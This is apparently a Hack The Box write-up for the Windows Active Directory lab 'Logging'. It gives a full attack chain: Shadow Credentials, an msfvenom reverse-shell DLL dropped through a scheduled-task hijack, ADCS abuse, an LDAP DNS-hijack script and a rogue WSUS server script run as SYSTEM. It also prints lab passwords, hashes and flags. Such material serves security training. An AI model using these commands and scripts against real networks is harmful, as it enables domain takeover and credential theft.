# Logging

OS: Windows / Active Directory\
Difficulty: Medium

**Domain:** `logging.htb` · **DC:** `DC01.logging.htb` (10.129.245.130) · **OS:** Windows Server 2025 · HTB Season 10

> Starting creds (given): `wallace.everette / Welcome2026@`

**Tags:** `#htb` `#windows` `#active-directory` `#shadow-credentials` `#genericwrite` `#protected-users` `#dll-hijack` `#adcs` `#esc1` `#dns-hijack` `#wsus-hijack`

## Attack chain

```
SMB log leak → svc_recovery creds (password rotation pattern)
  → Shadow Credentials (GenericWrite on msa_health$) → NT hash
  → DLL hijack via UpdateMonitor.exe scheduled task → shell as jaylee.clifton (user.txt)
  → ADCS: jaylee (IT group) enrolls UpdateSrv cert with attacker-controlled SAN
  → DNS hijack: wsus.logging.htb → attacker IP via msa_health$ LDAP write
  → rogue WSUS server (wsuks + PsExec64) → SYSTEM adds msa_health$ to Administrators
  → Evil-WinRM as msa_health$ → root.txt
```

## 1. Recon

```bash
nmap 10.129.245.130 -Pn -T5 -sV -sC -p- --open --reason
```
Key ports: 53, 80 (IIS 10.0), 88, 135/139, 389/636, 445 (signing required), 3268, 5985 (WinRM), **8530/8531 (WSUS HTTP/HTTPS)**, 9389. Clock skew ~7h:
```bash
sudo ntpdate DC01.logging.htb
```

### SMB enumeration
```bash
smbmap -d logging.htb -H 10.129.245.130 -u wallace.everette -p "Welcome2026@"
# LOGS share readable
smbclient "\\DC01.logging.htb\logs" -U "wallace.everette%Welcome2026@"
#  > get IdentitySync_Trace_20260219.log
```
The log reveals a new host `HR01.logging.htb` and a **failed** plaintext login for `svc_recovery:Em3rg3ncyPa$$2025`. The year suffix is a rotation pattern → try `Em3rg3ncyPa$$2026`.

### BloodHound
```bash
bloodhound-python -u wallace.everette -p "Welcome2026@" -d logging.htb -c All --zip --dns-tcp -ns 10.129.245.130
```
Key findings:
- `svc_recovery` is in **Protected Users** → NTLM blocked, Kerberos only (no PtH / RC4 / NTLM relay).
- `svc_recovery` has **GenericWrite** on `msa_health$` → Shadow Credentials.
- `msa_health$` has **SeMachineAccountPrivilege** → can add computer accounts / write DNS records.
- `jaylee.clifton` is in the **IT** group → IT has Enroll rights on the `UpdateSrv` cert template.

## 2. Initial access (Kerberos setup)

`svc_recovery:Em3rg3ncyPa$$2026` works but NTLM is restricted (Protected Users), so use Kerberos. `/etc/krb5.conf`:
```ini
[libdefaults]
    default_realm = LOGGING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
[realms]
    LOGGING.HTB = { kdc = 10.129.245.130 }
[domain_realm]
    .logging.htb = LOGGING.HTB
    logging.htb  = LOGGING.HTB
```
```bash
impacket-getTGT logging.htb/svc_recovery:"Em3rg3ncyPa$$2026" -dc-ip 10.129.245.130
export KRB5CCNAME=svc_recovery.ccache
klist
```

## 3. Shadow Credentials → msa_health$

`svc_recovery` has GenericWrite on `msa_health$`, so it can write `msDS-KeyCredentialLink`. Certipy generates a temp cert, adds it, authenticates via PKINIT, extracts the NT hash, and auto-restores the original value:
```bash
certipy-ad shadow auto -u "svc_recovery@logging.htb" -k --no-pass \
  -account "msa_health$" -dc-ip 10.129.245.130 -target DC01.logging.htb
# NT hash for msa_health$: 603fc24ee01a9409f83c9d1d701485c5
```
```bash
evil-winrm -i dc01.logging.htb -u "msa_health$" -H "603fc24ee01a9409f83c9d1d701485c5"
# Documents\monitor.ps1 → monitors the "UpdateChecker Agent" scheduled task
```

## 4. DLL hijack → jaylee.clifton (user.txt)

The scheduled task **UpdateChecker Agent** runs `UpdateMonitor.exe` as `jaylee.clifton` every 3 minutes. Decompiled (`monodis`), it:
1. checks `C:\ProgramData\UpdateMonitor\Settings_Update.zip`,
2. extracts to `C:\Program Files\UpdateMonitor\bin\`,
3. `LoadLibrary`s `settings_update.dll` and calls its exported `PreUpdateCheck()`.

`BUILTIN\Users` has write (`WD,AD,WEA,WA`) on `C:\ProgramData\UpdateMonitor`, so any authenticated user can drop the ZIP and run code as `jaylee.clifton`:
```bash
icacls "C:\ProgramData\UpdateMonitor"   # BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
```
```bash
# 1. Malicious DLL (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.46 LPORT=1337 -a x86 --platform windows -f dll -o settings_update.dll
# 2. Package
zip Settings_Update.zip settings_update.dll
# 3. Host
python3 -m http.server 1338
# 4. Deliver from the msa_health$ shell
(New-Object System.Net.WebClient).DownloadFile("http://10.10.15.46:1338/Settings_Update.zip","C:\ProgramData\UpdateMonitor\Settings_Update.zip")
# 5. Listen — task fires within ~3 min → shell as logging\jaylee.clifton
nc -lnvp 1337
```
`user.txt` → `af395bf8c8a221357fef0a75e95b7acf` (`C:\Users\jaylee.clifton\Desktop`).

## 5. ADCS — UpdateSrv cert enrollment

Template `UpdateSrv`: enrollment rights `LOGGING.HTB\IT` (jaylee is in IT), **Enrollee Supplies Subject = True** (attacker controls SAN, ESC1-adjacent), EKU = Server Authentication. Goal: a CA-signed cert for `wsus.logging.htb` so the DC trusts a rogue WSUS server over HTTPS (8531).
```bash
certipy-ad find -u "msa_health$" -hashes ":603fc24ee01a9409f83c9d1d701485c5" -dc-ip 10.129.245.130 -stdout -enabled -vulnerable
```
Generate key + CSR with the WSUS SAN:
```bash
cat > wsus_openssl.cnf <<EOF
[ req ]
default_bits = 2048
prompt = no
default_md = sha256
distinguished_name = dn
req_extensions = req_ext
[ dn ]
CN = wsus.logging.htb
[ req_ext ]
subjectAltName = @alt_names
[ alt_names ]
DNS.1 = wsus.logging.htb
DNS.2 = wsus
EOF
openssl req -new -newkey rsa:2048 -nodes -keyout wsus.key -out wsus.csr -config wsus_openssl.cnf
```
Submit the CSR to the CA from the jaylee shell, retrieve the cert, and build PEMs for wsuks:
```bash
certutil -urlcache -f "http://10.10.15.46:1338/wsus.csr" wsus.csr
certreq -submit -config "DC01.logging.htb\logging-DC01-CA" -attrib "CertificateTemplate:UpdateSrv" wsus.csr wsus.cer
openssl pkcs12 -export -inkey wsus.key -in wsus.cer -out wsus.pfx
openssl pkcs12 -in wsus.pfx -out wsus_srv_cert.pem -clcerts -nokeys -passin pass:""
openssl pkcs12 -in wsus.pfx -out wsus_srv_key.pem  -nocerts  -nodes  -passin pass:""
```

## 6. DNS hijack — wsus.logging.htb

`msa_health$` (machine account) can write DNS records to `DomainDnsZones` via LDAP — point `wsus.logging.htb` at the attacker (10.10.15.46):
```python
# add_dns.py
import ldap3, struct
ATTACKER_IP="10.10.15.46"; DC_IP="10.129.245.130"
ip=bytes(int(x) for x in ATTACKER_IP.split("."))
record=struct.pack("<HHBBHIIII",4,1,5,0xF0,0,1,180,0,0)+ip
s=ldap3.Server(DC_IP,port=389)
c=ldap3.Connection(s,user="logging.htb\\msa_health$",
  password="aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5",
  authentication=ldap3.NTLM,auto_bind=True)
dn="DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb"
c.add(dn,["top","dnsNode"],{"dnsRecord":[record],"dnsTombstoned":"FALSE"})
print(c.result)
```
```bash
# Alternative: dnstool.py -u 'logging.htb\msa_health$' --hashes ':603f...' -r wsus.logging.htb -a add -d 10.10.15.46 10.129.245.130
nslookup wsus.logging.htb 10.129.245.130   # → 10.10.15.46
```

## 7. Rogue WSUS server → SYSTEM

`wsuks` serves `PsExec64.exe` as a fake Windows Update; the DC's WSUS client polls `wsus.logging.htb:8531` (TLS, our CA-signed cert validates) and installs it, running our command as SYSTEM:
```python
# run_wsus.py (serves 8530 plain + 8531 TLS)
import ssl, sys, os, threading
from functools import partial
from http.server import HTTPServer
HOST="10.10.15.46"; EXE="./PsExec64.exe"
PAYLOAD='/accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add"'
sys.modules["wsuks.lib.router"]=type(sys)("stub"); sys.modules["wsuks.lib.router"].Router=object
from wsuks.lib.logger import initLogger; initLogger(debug=False)
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer
h=WSUSUpdateHandler(open(EXE,"rb").read(), os.path.basename(EXE), f"http://{HOST}:8530")
h.set_resources_xml(PAYLOAD)
def serve(port,use_tls):
    httpd=HTTPServer((HOST,port),partial(WSUSBaseServer,h))
    if use_tls:
        ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain("./wsus_srv_cert.pem","./wsus_srv_key.pem")
        httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
    httpd.serve_forever()
threading.Thread(target=serve,args=(8530,False),daemon=True).start()
serve(8531,True)
```
```bash
pip install wsuks --break-system-packages
wget https://live.sysinternals.com/tools/PsExec64.exe
python3 run_wsus.py      # wait for the DC poll (~minutes)
```

## 8. Root

```bash
# msa_health$ is now a local admin
evil-winrm -i dc01.logging.htb -u "msa_health$" -H "603fc24ee01a9409f83c9d1d701485c5"
# root.txt → C:\users\toby.brynleigh\Desktop\root.txt
```

## Credentials summary

| Account | Secret | Source |
|---|---|---|
| wallace.everette | Welcome2026@ | given |
| svc_recovery | Em3rg3ncyPa$$2026 | SMB log leak + rotation pattern |
| msa_health$ | `603fc24ee01a9409f83c9d1d701485c5` (NT) | Shadow Credentials |
| jaylee.clifton | (DLL-hijack shell) | scheduled task DLL hijack |

---
*Migrated from a local CherryTree lab export. Review evidence before reuse.*
